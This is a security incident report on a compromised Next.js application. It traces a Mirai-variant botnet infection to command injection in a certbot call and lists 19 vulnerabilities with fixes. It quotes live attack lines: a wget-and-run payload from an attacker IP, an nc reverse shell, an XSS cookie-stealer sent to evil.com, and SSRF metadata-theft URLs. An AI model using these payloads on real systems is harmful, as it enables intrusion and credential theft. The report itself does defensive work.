# Detailed Security Incident & Vulnerability Report

**Project:** YCH Full-Stack Application (Admin Dashboard + Public Website)
**Report Date:** December 26, 2025
**Severity Level:** CRITICAL
**Status:** Server Compromised - Immediate Action Required
**Prepared By:** Security Analysis Team

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Incident Overview - 100% CPU Issue](#2-incident-overview---100-cpu-issue)
3. [Malware Analysis](#3-malware-analysis)
4. [Vulnerability Details (19 Issues)](#4-vulnerability-details-19-issues)
5. [Affected Files Summary](#5-affected-files-summary)
6. [Immediate Response Actions](#6-immediate-response-actions)
7. [Remediation Plan](#7-remediation-plan)
8. [Code Fix Examples](#8-code-fix-examples)
9. [Testing Checklist](#9-testing-checklist)
10. [Recommendations](#10-recommendations)

---

## 1. Executive Summary

### 1.1 Overview

During the investigation of a **100% CPU usage issue** on the production server, a comprehensive security audit was performed. The audit revealed that the server has been **actively compromised** through a Remote Code Execution (RCE) vulnerability.

### 1.2 Key Findings

| Finding | Details |
|---------|---------|
| **Root Cause** | Command Injection vulnerability in domain parameter |
| **Attack Status** | Active - Malware downloaded and executed |
| **Attacker IPs** | 94.154.35.154 (malware), 193.142.147.209 (C2) |
| **Total Vulnerabilities** | 19 |
| **Critical Issues** | 5 |
| **High Issues** | 8 |
| **Medium Issues** | 5 |
| **Low Issues** | 1 |

### 1.3 Vulnerability Breakdown

```
CRITICAL (5)
├── Command Injection (RCE) - ACTIVELY EXPLOITED
├── No Auth - Article Delete API
├── No Auth - Article Save API
├── No Auth - Article Update API
└── No Auth - Profile API (IDOR)

HIGH (8)
├── No Auth - Pages Save API
├── No Auth - Get All Sites API (Data Leak)
├── No Auth - Get Companies API (Data Leak)
├── No Auth - Freestar API
├── Hardcoded JWT Secrets (11 files)
├── SSRF in Logo/Favicon Upload
├── No Rate Limiting - Login
└── No Rate Limiting - OTP

MEDIUM (5)
├── XSS via dangerouslySetInnerHTML (8 files)
├── Missing Security Headers
├── Middleware Bypasses API Routes
├── Password Stored in localStorage
└── Weak OTP Implementation

LOW (1)
└── Prisma Disconnect in Finally Block
```

---

## 2. Incident Overview - 100% CPU Issue

### 2.1 Symptom

When the application was started using PM2, CPU usage immediately spiked to 100% and the application became unresponsive.

### 2.2 Root Cause Analysis

The CPU spike was caused by **malware execution** on the server. An attacker exploited a Command Injection vulnerability to download and run botnet malware.

### 2.3 Attack Chain

```
Step 1: Attacker Discovery
        └── Attacker found /api/site/create endpoint accepts domain parameter

Step 2: Payload Crafting
        └── Attacker crafted malicious domain value with shell commands

Step 3: Request Sent
        └── POST /api/site/create
            Body: { domain: "test.com; wget http://94.154.35.154/weball.sh -O /tmp/x.sh && sh /tmp/x.sh; #" }

Step 4: Command Execution
        └── Server executed: sudo certbot -d test.com; wget http://94.154.35.154/weball.sh...

Step 5: Malware Download
        └── weball.sh script downloaded to /tmp/x.sh

Step 6: Malware Execution
        └── Script executed, downloading botnet binaries for multiple architectures

Step 7: Reverse Shell
        └── Attempted connection to 193.142.147.209:12323

Step 8: CPU Consumption
        └── Malware processes consuming 100% CPU
```

### 2.4 Evidence from PM2 Logs

**Log Entry 1 - Malware Download Attempt:**
```
Error: Command failed: cd /tmp; wget -O /tmp/x.sh http://94.154.35.154/weball.sh ;
chmod +x /tmp/x.sh; sh /tmp/x.sh; rm /tmp/f;mkfifo /tmp/f;
cat /tmp/f|/bin/sh -i 2>&1|nc 193.142.147.209 12323 >/tmp/f
```

**Log Entry 2 - Multiple Architecture Binaries:**
```
Downloading: x86_64.uhavenobotsxd
Downloading: x86_32.uhavenobotsxd
Downloading: arm.uhavenobotsxd
Downloading: arm5.uhavenobotsxd
Downloading: arm6.uhavenobotsxd
Downloading: arm7.uhavenobotsxd
Downloading: mips.uhavenobotsxd
Downloading: mipsel.uhavenobotsxd
Downloading: powerpc.uhavenobotsxd
Downloading: sparc.uhavenobotsxd
Downloading: m68k.uhavenobotsxd
Downloading: sh4.uhavenobotsxd
```

---

## 3. Malware Analysis

### 3.1 Malware Type

The malware identified is a **Mirai Botnet Variant**. The naming convention "uhavenobotsxd" is characteristic of Mirai-style botnets.

### 3.2 Attacker Infrastructure

| Component | IP/Port | Purpose |
|-----------|---------|---------|
| Malware Distribution Server | 94.154.35.154:80 | Hosts weball.sh and botnet binaries |
| Command & Control Server | 193.142.147.209:12323 | Receives reverse shell connections |

### 3.3 Malware Capabilities

| Capability | Description |
|------------|-------------|
| **DDoS Attacks** | Server can be used to attack other systems |
| **Cryptomining** | CPU used for cryptocurrency mining |
| **Data Exfiltration** | Database contents can be stolen |
| **Lateral Movement** | Attack other internal systems |
| **Persistence** | May install backdoors, cron jobs, SSH keys |

### 3.4 Downloaded Files

| File | Size | Architecture |
|------|------|--------------|
| x86_64.uhavenobotsxd | 92KB | 64-bit Intel/AMD |
| x86_32.uhavenobotsxd | 87KB | 32-bit Intel/AMD |
| arm.uhavenobotsxd | 104KB | ARM generic |
| arm5.uhavenobotsxd | 100KB | ARM v5 |
| arm6.uhavenobotsxd | 112KB | ARM v6 |
| arm7.uhavenobotsxd | 132KB | ARM v7 |
| mips.uhavenobotsxd | 131KB | MIPS big-endian |
| mipsel.uhavenobotsxd | 133KB | MIPS little-endian |
| powerpc.uhavenobotsxd | 96KB | PowerPC |
| sparc.uhavenobotsxd | 21KB | SPARC |
| m68k.uhavenobotsxd | 21KB | Motorola 68000 |
| sh4.uhavenobotsxd | 21KB | SuperH |

---

## 4. Vulnerability Details (19 Issues)

---

### ISSUE #1: Command Injection (CRITICAL)

**Severity:** CRITICAL
**CVSS Score:** 10.0
**Status:** ACTIVELY EXPLOITED

**Affected Files:**
- `lib/local.ts` - Line 101
- `lib/cloudflare.ts` - Line 152, 167

**Vulnerable Code in lib/local.ts:**
```typescript
// Line 98-107
export async function installSSLCertificate(domain: string): Promise<boolean> {
    try {
        const { stdout, stderr } = await execAsync(
            `sudo certbot --nginx -d ${domain} --non-interactive --agree-tos --register-unsafely-without-email`
        );
        //                         ^^^^^^^^
        //                         USER INPUT DIRECTLY IN SHELL COMMAND!
        return true;
    } catch (error) {
        return false;
    }
}
```

**Vulnerable Code in lib/cloudflare.ts:**
```typescript
// Line 149-170
export async function removeServerSSL(domain: string): Promise<boolean> {
    return new Promise((resolve) => {
        const revokeCommand = `sudo certbot revoke --cert-path /etc/letsencrypt/live/${domain}/fullchain.pem --reason cessation_of_operation`;
        //                                                                            ^^^^^^^^
        exec(revokeCommand, (error) => {
            const deleteCommand = `sudo certbot delete --cert-name ${domain}`;
            //                                                      ^^^^^^^^
            exec(deleteCommand, () => resolve(true));
        });
    });
}
```

**Attack Entry Points:**
- `app/api/site/create/route.ts` - Line 355 (createLocalConfig)
- `app/api/site/create/route.ts` - Line 422 (installSSLCertificate)
- `app/api/site/delete/route.ts` - Line 57 (removeServerSSL)

**How Attack Works:**
```
Normal Input:  domain = "example.com"
Shell Command: sudo certbot --nginx -d example.com --non-interactive...

Attack Input:  domain = "test.com; malicious_command; #"
Shell Command: sudo certbot --nginx -d test.com; malicious_command; # --non-interactive...
                                                 ^^^^^^^^^^^^^^^^^^
                                                 EXECUTED AS SEPARATE COMMAND!
```

**Impact:**
- Full server compromise
- Arbitrary command execution as root (sudo)
- Data theft, malware installation, lateral movement

**Solution:**
1. Add strict domain validation regex
2. Use `spawn()` with array arguments instead of `exec()` with string
3. Never interpolate user input into shell commands

---

### ISSUE #2: No Authentication - Article Delete (CRITICAL)

**Severity:** CRITICAL
**CVSS Score:** 9.1

**Affected File:** `app/api/articles/delete/route.tsx`

**Vulnerable Code:**
```typescript
// Line 4-21
export async function POST(req: NextRequest) {
  try {
    const { articleId } = await req.json();

    // NO AUTHENTICATION CHECK HERE!
    // Anyone can call this endpoint!

    if (!articleId) {
      return NextResponse.json({ error: 'Missing articleId' }, { status: 400 });
    }

    await prisma.articleTag.deleteMany({ where: { article_id: articleId } });
    await prisma.article.delete({ where: { id: articleId } });

    return NextResponse.json({ success: true });
  } catch (error) {
    return NextResponse.json({ error: 'Internal server error' }, { status: 500 });
  }
}
```

**Impact:**
- Anyone can delete any article from any site
- No login required
- Complete data destruction possible

**Proof of Concept:**
```bash
curl -X POST https://yoursite.com/api/articles/delete \
  -H "Content-Type: application/json" \
  -d '{"articleId": "any-article-uuid"}'
```

**Solution:**
- Add JWT token verification
- Verify user owns the article before deletion

---

### ISSUE #3: No Authentication - Article Save (CRITICAL)

**Severity:** CRITICAL
**CVSS Score:** 9.1

**Affected File:** `app/api/articles/save/route.ts`

**Vulnerable Code:**
```typescript
// Line 91-184
export async function POST(req: NextRequest) {
  const formData = await req.formData();
  const siteId = formData.get('siteId') as string;
  const articlesJson = formData.get('articles') as string;

  // NO AUTHENTICATION CHECK!
  // Anyone can add articles to ANY site!

  const articles = JSON.parse(articlesJson);
  // ... creates articles in database
}
```

**Impact:**
- Anyone can create articles on any site
- Spam injection
- SEO poisoning
- Malicious content distribution

**Solution:**
- Add JWT verification
- Verify user owns the site

---

### ISSUE #4: No Authentication - Article Update (CRITICAL)

**Severity:** CRITICAL
**CVSS Score:** 9.1

**Affected File:** `app/api/articles/update/route.tsx`

**Vulnerable Code:**
```typescript
// Line 26-97
export async function POST(req: NextRequest) {
  try {
    const formData = await req.formData();
    const articleId = formData.get('articleId') as string;

    // NO AUTHENTICATION CHECK!

    const updated = await prisma.article.update({
      where: { id: articleId },
      data: { title, slug, content, meta_description }
    });
  }
}
```

**Impact:**
- Anyone can modify any article
- Content tampering
- Defacement

**Solution:**
- Add JWT verification
- Verify user owns the article

---

### ISSUE #5: No Authentication - Profile API / IDOR (CRITICAL)

**Severity:** CRITICAL
**CVSS Score:** 8.6

**Affected File:** `app/api/profile/route.ts`

**Vulnerable Code - GET:**
```typescript
// Line 101-162
export async function GET(req: Request) {
  const { searchParams } = new URL(req.url);
  const userId = searchParams?.get("userId");

  // NO AUTHENTICATION!
  // NO OWNERSHIP CHECK!
  // Anyone can read ANY user's profile!

  const user = await prisma.user.findUnique({
    where: { id: userId },
    include: { metas: true },
  });

  return NextResponse.json({
    username: user.nicename,
    email: user.email,
    personalInfo: { firstName, lastName, phone, ... },
    companyInfo: { company, vat, address, ... }
  });
}
```

**Vulnerable Code - PATCH:**
```typescript
// Line 164-229
export async function PATCH(req: Request) {
  const { userId, personalInfo, companyInfo } = body;

  // NO AUTHENTICATION!
  // Anyone can MODIFY ANY user's profile!

  await prisma.userMeta.upsert({ ... });
}
```

**Impact:**
- Read any user's personal information
- Modify any user's profile
- Identity theft
- Account takeover preparation

**Solution:**
- Add JWT verification
- Extract userId from token, not from request parameter
- User can only access their own profile

---

### ISSUE #6: No Authentication - Pages Save (HIGH)

**Severity:** HIGH
**CVSS Score:** 8.1

**Affected File:** `app/api/pages/save/route.ts`

**Vulnerable Code:**
```typescript
// Line 6-56
export async function POST(req: NextRequest) {
  const { siteId, pages } = await req.json();

  // NO AUTHENTICATION!

  await prisma.staticPage.deleteMany({ where: { site_id: siteId } });
  // Creates new pages...
}
```

**Impact:**
- Modify About, Privacy, Terms pages on any site
- Legal liability issues
- Defacement

**Solution:**
- Add JWT verification
- Verify user owns the site

---

### ISSUE #7: No Authentication - Get All Sites / Data Leak (HIGH)

**Severity:** HIGH
**CVSS Score:** 7.5

**Affected File:** `app/api/site/get-all/route.ts`

**Vulnerable Code:**
```typescript
// Line 4-40
export async function GET(request: NextRequest) {
  // NO AUTHENTICATION!

  const sites = await prisma.site.findMany({
    include: {
      site_meta: true,
      articles: true,
      static_pages: true,
      company: true,
      user: {
        select: { id: true, email: true, nicename: true }
        //                  ^^^^^
        //                  EXPOSES ALL USER EMAILS!
      },
    },
  });
  return NextResponse.json(sites);  // Returns ALL sites from ALL users!
}
```

**Impact:**
- View all sites from all users
- Harvest user emails
- Competitive intelligence theft
- GDPR violation

**Solution:**
- Add JWT verification
- Filter: `where: { user_id: authenticatedUserId }`

---

### ISSUE #8: No Authentication - Get Companies / Data Leak (HIGH)

**Severity:** HIGH
**CVSS Score:** 7.5

**Affected File:** `app/api/companies/get/route.ts`

**Vulnerable Code:**
```typescript
// Line 4-104
export async function GET(req: NextRequest) {
  // NO AUTHENTICATION!

  const companies = await prisma.company.findMany({
    include: {
      user: { select: { id: true, email: true, nicename: true } },
      sites: { select: { id: true, domain: true, site_name: true } }
    }
  });
  // Returns ALL companies from ALL users!
}
```

**Impact:**
- View all companies with contact details
- Business intelligence theft
- GDPR violation

**Solution:**
- Add JWT verification
- Filter by authenticated user

---

### ISSUE #9: No Authentication - Freestar API (HIGH)

**Severity:** HIGH
**CVSS Score:** 7.5

**Affected File:** `app/api/freestar/insertupdate/route.tsx`

**Vulnerable Code:**
```typescript
// Line 5-104
export async function POST(req: NextRequest) {
  const { domain, keyword, src, market, ... } = body;

  // NO AUTHENTICATION!

  await prisma.freestarYsmTypecodes.upsert({ ... });
}
```

**Impact:**
- Manipulate analytics data
- Fraudulent reporting
- Revenue impact

**Solution:**
- Add JWT or API key verification

---

### ISSUE #10: Hardcoded JWT Secrets (HIGH)

**Severity:** HIGH
**CVSS Score:** 9.0

**Affected Files (11 total):**

| File | Line | Hardcoded Value |
|------|------|-----------------|
| `app/api/auth/login/route.ts` | 120 | `'your-secret-key'` |
| `app/api/auth/login/route.ts` | 127 | `'your-refresh-secret-key'` |
| `app/api/auth/refresh/route.ts` | 94 | `'your-refresh-secret-key'` |
| `app/api/auth/refresh/route.ts` | 126 | `'your-secret-key'` |
| `app/api/auth/refresh/route.ts` | 133 | `'your-refresh-secret-key'` |
| `app/api/auth/verify/route.ts` | 74 | `'your-secret-key'` |
| `app/api/auth/sessions/route.ts` | 17 | `'your-secret-key'` |
| `app/api/auth/sessions/route.ts` | 68 | `'your-secret-key'` |
| `app/api/auth/logout/route.tsx` | 90 | `'your-refresh-secret-key'` |
| `app/api/companies/delete/route.ts` | 27 | `'your-secret-key'` |
| `app/api/companies/update/route.ts` | 35 | `'your-secret-key'` |
| `app/api/companies/toggle-status/route.ts` | 34 | `'your-secret-key'` |
| `app/api/site/create/route.ts` | 300 | `'your-secret-key'` |
| `app/api/site/update/route.ts` | 37 | `''` (empty string!) |

**Vulnerable Code Pattern:**
```typescript
jwt.verify(token, process.env.JWT_SECRET || 'your-secret-key')
//                                          ^^^^^^^^^^^^^^^^^^
//                                          If env var not set, uses this!
```

**Impact:**
- If JWT_SECRET env var is not set, attacker knows the secret
- Can forge valid JWT tokens
- Impersonate any user
- Full authentication bypass

**Solution:**
```typescript
const secret = process.env.JWT_SECRET;
if (!secret) {
  throw new Error('FATAL: JWT_SECRET not configured');
}
jwt.verify(token, secret);
```

---

### ISSUE #11: Server-Side Request Forgery / SSRF (HIGH)

**Severity:** HIGH
**CVSS Score:** 7.5

**Affected File:** `app/api/site/create/route.ts`

**Vulnerable Code:**
```typescript
// Line 512 - Logo URL
const logoResponse = await fetch(logoUrl);
//                               ^^^^^^^^
//                               USER-PROVIDED URL!

// Line 575 - Favicon URL
const faviconResponse = await fetch(faviconUrl);
//                                  ^^^^^^^^^^^
```

**Attack Scenarios:**
```bash
# Access internal services
logoUrl=http://localhost:3000/api/admin/secret

# Access cloud metadata (AWS/GCP/Azure credentials)
logoUrl=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Port scanning
logoUrl=http://internal-database:5432/

# Access internal network
logoUrl=http://192.168.1.1/admin
```

**Impact:**
- Access internal services
- Steal cloud credentials
- Network reconnaissance
- Bypass firewalls

**Solution:**
- Whitelist allowed domains
- Block internal IP ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16)
- Validate URL protocol (only HTTPS)

---

### ISSUE #12: No Rate Limiting - Login (HIGH)

**Severity:** HIGH
**CVSS Score:** 7.5

**Affected File:** `app/api/auth/login/route.ts`

**Issue:** No limit on login attempts

**Impact:**
- Brute force password attacks
- Credential stuffing attacks
- Account lockout DoS

**Solution:**
- Implement rate limiting (5 attempts per minute per IP)
- Add account lockout after 10 failed attempts
- Add CAPTCHA after 3 failed attempts

---

### ISSUE #13: No Rate Limiting - OTP (HIGH)

**Severity:** HIGH
**CVSS Score:** 7.5

**Affected Files:**
- `app/api/auth/send-registration-otp/route.ts`
- `app/api/auth/verify-otp/route.ts`
- `app/api/auth/forgot-password/route.ts`

**Impact:**
- OTP bombing (cost for SMS)
- Email bombing
- OTP brute force (6 digits = 1,000,000 combinations)

**Solution:**
- Rate limit: 3 OTP requests per hour per email
- Max 3 verification attempts per OTP
- Exponential backoff

---

### ISSUE #14: XSS via dangerouslySetInnerHTML (MEDIUM)

**Severity:** MEDIUM
**CVSS Score:** 6.1

**Affected Files (8):**

| File | Line | Content Source |
|------|------|----------------|
| `app/[category]/[slug]/client.tsx` | 112 | `article.content` |
| `app/article/[slug]/page.tsx` | 59 | `article.content` |
| `app/about/page.tsx` | 66 | `page_html` |
| `app/terms/page.tsx` | 58 | `page_html` |
| `app/privacy-policy/page.tsx` | 60 | `page_html` |
| `app/for-advertisers/page.tsx` | 60 | `page_html` |
| `app/search/[[...slug]]/client.tsx` | 206 | External API |
| `app/search/[[...slug]]/client.tsx` | 228, 257, 270 | External API |

**Vulnerable Code:**
```typescript
<div dangerouslySetInnerHTML={{ __html: article.content }} />
//                                       ^^^^^^^^^^^^^^^
//                                       If content contains <script>, it executes!
```

**Attack Scenario:**
1. Attacker creates article with content: `<script>document.location='http://evil.com/steal?c='+document.cookie</script>`
2. User views article
3. Script executes, steals session cookie
4. Attacker hijacks user session

**Solution:**
- Use DOMPurify to sanitize HTML
```typescript
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(article.content) }} />
```

---

### ISSUE #15: Missing Security Headers (MEDIUM)

**Severity:** MEDIUM
**CVSS Score:** 5.3

**Affected File:** `next.config.js`

**Current Headers:**
```javascript
headers: [
  { key: 'X-Frame-Options', value: 'DENY' },
  { key: 'X-Content-Type-Options', value: 'nosniff' },
  { key: 'X-XSS-Protection', value: '1; mode=block' },
]
```

**Missing Headers:**

| Header | Purpose |
|--------|---------|
| `Content-Security-Policy` | Prevent XSS, code injection |
| `Strict-Transport-Security` | Force HTTPS |
| `Referrer-Policy` | Control referrer information |
| `Permissions-Policy` | Disable unnecessary browser features |

**Solution:**
```javascript
headers: [
  { key: 'X-Frame-Options', value: 'DENY' },
  { key: 'X-Content-Type-Options', value: 'nosniff' },
  { key: 'Strict-Transport-Security', value: 'max-age=31536000; includeSubDomains' },
  { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
  { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
  { key: 'Content-Security-Policy', value: "default-src 'self'; script-src 'self' 'unsafe-inline';" },
]
```

---

### ISSUE #16: Middleware Bypasses API Routes (MEDIUM)

**Severity:** MEDIUM
**CVSS Score:** 5.3

**Affected File:** `middleware.ts`

**Vulnerable Code:**
```typescript
// Line 63-66
export const config = {
  matcher: [
    "/((?!api|_next/static|_next/image|favicon.ico|robots.txt|sitemap.xml).*)",
    //   ^^^
    //   API ROUTES ARE EXCLUDED FROM AUTH CHECK!
  ],
};
```

**Impact:**
- Authentication middleware doesn't run on API routes
- Each API route must implement its own auth (many don't)

**Solution:**
- Create auth wrapper function for API routes
- Or include API routes in middleware with selective exclusions

---

### ISSUE #17: Password in localStorage (MEDIUM)

**Severity:** MEDIUM
**CVSS Score:** 5.3

**Affected File:** `app/page.tsx`

**Vulnerable Code:**
```typescript
// Line 41-42
const savedEmail = localStorage.getItem("rememberedEmail") || "";
const savedPassword = localStorage.getItem("rememberedPassword") || "";
//                                          ^^^^^^^^^^^^^^^^^^
//                                          PASSWORD IN LOCAL STORAGE!
```

**Impact:**
- XSS attack can steal password
- Browser extensions can access localStorage
- Password persists after logout

**Solution:**
- Never store passwords in localStorage
- Use httpOnly secure cookies
- Only remember email, not password

---

### ISSUE #18: Weak OTP Implementation (MEDIUM)

**Severity:** MEDIUM
**CVSS Score:** 5.3

**Affected File:** `lib/otpStore.ts`

**Issues:**
```typescript
// In-memory storage
const otpStore = new Map<string, { otp: string; expiresAt: number }>();

// Problems:
// 1. Lost on server restart
// 2. 6-digit OTP = 1,000,000 combinations (brute-forceable)
// 3. No attempt limiting visible in code
```

**Solution:**
- Store OTP in Redis with TTL
- Use 8-digit OTP
- Limit to 3 verification attempts
- Lock after failed attempts

---

### ISSUE #19: Prisma Disconnect in Finally (LOW)

**Severity:** LOW
**CVSS Score:** 3.0

**Affected Files:**
- `app/api/companies/get/route.ts` (Line 102)
- `app/api/freestar/insertupdate/route.tsx` (Line 103)
- `app/api/auth/register/route.ts` (Line 431)

**Issue:**
```typescript
} finally {
    await prisma.$disconnect();
}
```

**Impact:**
- Can cause connection pool exhaustion
- Unnecessary in serverless environment
- Prisma handles connections automatically

**Solution:**
- Remove `prisma.$disconnect()` calls
- Let Prisma manage connection pooling

---

## 5. Affected Files Summary

### Critical Priority Files

| File | Issues | Action |
|------|--------|--------|
| `lib/local.ts` | #1 | Add validation, use spawn() |
| `lib/cloudflare.ts` | #1 | Add validation, use spawn() |
| `api/articles/delete/route.tsx` | #2 | Add JWT auth |
| `api/articles/save/route.ts` | #3 | Add JWT auth + ownership |
| `api/articles/update/route.tsx` | #4 | Add JWT auth + ownership |
| `api/profile/route.ts` | #5 | Add JWT auth + IDOR fix |

### High Priority Files

| File | Issues | Action |
|------|--------|--------|
| `api/pages/save/route.ts` | #6 | Add JWT auth |
| `api/site/get-all/route.ts` | #7 | Add JWT auth + filter |
| `api/companies/get/route.ts` | #8 | Add JWT auth + filter |
| `api/freestar/insertupdate/route.tsx` | #9 | Add auth |
| `api/auth/login/route.ts` | #10, #12 | Remove hardcoded, add rate limit |
| `api/auth/refresh/route.ts` | #10 | Remove hardcoded secrets |
| `api/auth/verify/route.ts` | #10 | Remove hardcoded secrets |
| `api/site/create/route.ts` | #10, #11 | Remove hardcoded, fix SSRF |

### Medium Priority Files

| File | Issues | Action |
|------|--------|--------|
| Frontend pages (8 files) | #14 | Add DOMPurify |
| `next.config.js` | #15 | Add security headers |
| `middleware.ts` | #16 | Fix API route exclusion |
| `app/page.tsx` | #17 | Remove password from localStorage |
| `lib/otpStore.ts` | #18 | Use Redis, stronger OTP |

---

## 6. Immediate Response Actions

### 6.1 Stop the Server (Do First!)
```bash
pm2 stop all
pm2 delete all
```

### 6.2 Kill Malware Processes
```bash
# Kill known malware processes
pkill -9 -f "uhavenobotsxd"
pkill -9 -f "nc.*12323"
pkill -9 -f "wget.*154"
pkill -9 -f "curl.*154"

# Find and kill suspicious processes
ps aux | grep -E "tmp|wget|curl|nc" | grep -v grep
```

### 6.3 Block Attacker IPs
```bash
# Block malware distribution server
iptables -A INPUT -s 94.154.35.154 -j DROP
iptables -A OUTPUT -d 94.154.35.154 -j DROP

# Block C2 server
iptables -A INPUT -s 193.142.147.209 -j DROP
iptables -A OUTPUT -d 193.142.147.209 -j DROP

# Save rules
iptables-save > /etc/iptables.rules
```

### 6.4 Clean Malware Files
```bash
# Remove known malware files
rm -rf /tmp/*.sh
rm -rf /tmp/*uhavenobotsxd*
rm -rf /tmp/f
rm -rf /tmp/x.sh

# Find and remove executable files in /tmp
find /tmp -type f -executable -delete

# Check for other suspicious files
find / -name "*uhavenobotsxd*" 2>/dev/null
find / -mtime -1 -type f -name "*.sh" 2>/dev/null
```

### 6.5 Check for Persistence
```bash
# Check cron jobs
crontab -l
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/

# Check SSH authorized keys
cat ~/.ssh/authorized_keys
cat /root/.ssh/authorized_keys 2>/dev/null

# Check for new users
cat /etc/passwd | grep -v nologin | grep -v false
lastlog | head -20

# Check startup scripts
cat ~/.bashrc | tail -30
cat ~/.profile | tail -30
cat /etc/rc.local 2>/dev/null

# Check systemd services
systemctl list-unit-files --type=service | grep enabled
```

### 6.6 Rotate All Credentials
```bash
# Generate new secrets
openssl rand -base64 64  # For JWT_SECRET
openssl rand -base64 64  # For JWT_REFRESH_SECRET
openssl rand -base64 32  # For CRON_SECRET_TOKEN
```

**Update these in .env:**
- JWT_SECRET
- JWT_REFRESH_SECRET
- DATABASE_URL (change password)
- SENDGRID_API_KEY
- CLOUDFLARE_API_TOKEN
- OPENAI_API_KEY
- DO_SPACES_KEY
- DO_SPACES_SECRET
- CRON_SECRET_TOKEN

---

## 7. Remediation Plan

### Phase 1: Emergency (Today)

| Task | Priority | Time |
|------|----------|------|
| Stop server, kill malware | P0 | 30 min |
| Block attacker IPs | P0 | 15 min |
| Clean malware files | P0 | 30 min |
| Check for persistence | P0 | 1 hour |
| Rotate all credentials | P0 | 1 hour |
| Fix command injection (#1) | P0 | 2 hours |

### Phase 2: Critical Fixes (This Week)

| Task | Priority | Time |
|------|----------|------|
| Add auth to Article APIs (#2,3,4) | P0 | 3 hours |
| Fix Profile API IDOR (#5) | P0 | 2 hours |
| Remove hardcoded secrets (#10) | P0 | 2 hours |
| Add auth to Pages/Sites/Companies APIs (#6,7,8,9) | P1 | 4 hours |

### Phase 3: Security Hardening (This Month)

| Task | Priority | Time |
|------|----------|------|
| Fix SSRF (#11) | P1 | 3 hours |
| Add rate limiting (#12,13) | P1 | 4 hours |
| Fix XSS (#14) | P2 | 3 hours |
| Add security headers (#15) | P2 | 1 hour |
| Fix middleware (#16) | P2 | 2 hours |
| Fix localStorage password (#17) | P2 | 1 hour |
| Improve OTP (#18) | P2 | 4 hours |

---

## 8. Code Fix Examples

### Fix for Issue #1: Command Injection

**Create new file: `lib/security.ts`**
```typescript
export function validateDomain(input: string): string | null {
    if (!input || typeof input !== 'string') return null;

    const domain = input.toLowerCase().trim();

    // Strict domain pattern - only letters, numbers, hyphens, dots
    const pattern = /^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,}$/;
    if (!pattern.test(domain)) return null;

    // Block shell metacharacters
    const dangerous = [';', '|', '&', '$', '`', '(', ')', '{', '}',
                       '<', '>', '"', "'", '\\', '\n', '\r', ' ', '\t'];
    for (const char of dangerous) {
        if (domain.includes(char)) return null;
    }

    // Length check
    if (domain.length > 253) return null;
    if (domain.includes('..')) return null;

    return domain;
}
```

**Fix `lib/local.ts`:**
```typescript
import { spawn } from 'child_process';
import { validateDomain } from './security';

export async function installSSLCertificate(domain: string): Promise<boolean> {
    const validDomain = validateDomain(domain);
    if (!validDomain) {
        console.error('Invalid domain rejected:', domain);
        return false;
    }

    return new Promise((resolve) => {
        const proc = spawn('sudo', [
            'certbot', '--nginx',
            '-d', validDomain,
            '--non-interactive',
            '--agree-tos',
            '--register-unsafely-without-email'
        ], { shell: false });  // CRITICAL: shell: false

        proc.on('close', (code) => resolve(code === 0));
        proc.on('error', () => resolve(false));
    });
}
```

### Fix for Issues #2-9: Add Authentication

**Create auth helper: `lib/auth.ts`**
```typescript
import { NextRequest, NextResponse } from 'next/server';
import jwt from 'jsonwebtoken';

export interface AuthUser {
    userId: string;
    email: string;
}

export function getAuthUser(req: NextRequest): AuthUser | null {
    const token = req.cookies.get('token')?.value;
    if (!token) return null;

    const secret = process.env.JWT_SECRET;
    if (!secret) {
        console.error('JWT_SECRET not configured!');
        return null;
    }

    try {
        const decoded = jwt.verify(token, secret) as AuthUser;
        return decoded;
    } catch {
        return null;
    }
}

export function unauthorized() {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
}

export function forbidden() {
    return NextResponse.json({ error: 'Forbidden' }, { status: 403 });
}
```

**Fix `api/articles/delete/route.tsx`:**
```typescript
import { getAuthUser, unauthorized, forbidden } from '@/lib/auth';

export async function POST(req: NextRequest) {
    // Check authentication
    const user = getAuthUser(req);
    if (!user) return unauthorized();

    const { articleId } = await req.json();
    if (!articleId) {
        return NextResponse.json({ error: 'Missing articleId' }, { status: 400 });
    }

    // Check ownership
    const article = await prisma.article.findUnique({
        where: { id: articleId },
        include: { site: true }
    });

    if (!article || article.site.user_id !== user.userId) {
        return forbidden();
    }

    // Now safe to delete
    await prisma.articleTag.deleteMany({ where: { article_id: articleId } });
    await prisma.article.delete({ where: { id: articleId } });

    return NextResponse.json({ success: true });
}
```

### Fix for Issue #10: Remove Hardcoded Secrets

**Before:**
```typescript
jwt.verify(token, process.env.JWT_SECRET || 'your-secret-key')
```

**After:**
```typescript
const secret = process.env.JWT_SECRET;
if (!secret) {
    console.error('FATAL: JWT_SECRET environment variable is required');
    return NextResponse.json({ error: 'Server configuration error' }, { status: 500 });
}
jwt.verify(token, secret)
```

---

## 9. Testing Checklist

After fixes are applied, verify:

### Authentication Tests
- [ ] All protected endpoints return 401 without token
- [ ] Invalid token returns 401
- [ ] Expired token returns 401
- [ ] Valid token allows access

### Authorization Tests
- [ ] User A cannot access User B's profile
- [ ] User A cannot delete User B's articles
- [ ] User A cannot modify User B's sites
- [ ] User A cannot see User B's companies

### Input Validation Tests
- [ ] Domain with `;` is rejected
- [ ] Domain with `|` is rejected
- [ ] Domain with `&` is rejected
- [ ] Domain with `$()` is rejected
- [ ] Valid domain is accepted

### Security Header Tests
- [ ] CSP header present
- [ ] HSTS header present
- [ ] X-Frame-Options present
- [ ] X-Content-Type-Options present

### Rate Limiting Tests
- [ ] Login blocked after 5 attempts
- [ ] OTP request limited to 3/hour
- [ ] OTP verification limited to 3 attempts

---

## 10. Recommendations

### Immediate
1. **Incident Response**: Consider this a security incident, document everything
2. **User Notification**: If user data was accessed, notify affected users
3. **Legal Review**: Check GDPR/compliance requirements for breach notification

### Short-term
1. **Security Audit**: Engage external penetration testers
2. **Code Review**: Mandatory security review for all PRs
3. **Dependency Audit**: Run `npm audit` and fix vulnerabilities
4. **WAF**: Implement Web Application Firewall

### Long-term
1. **Security Training**: Train developers on OWASP Top 10
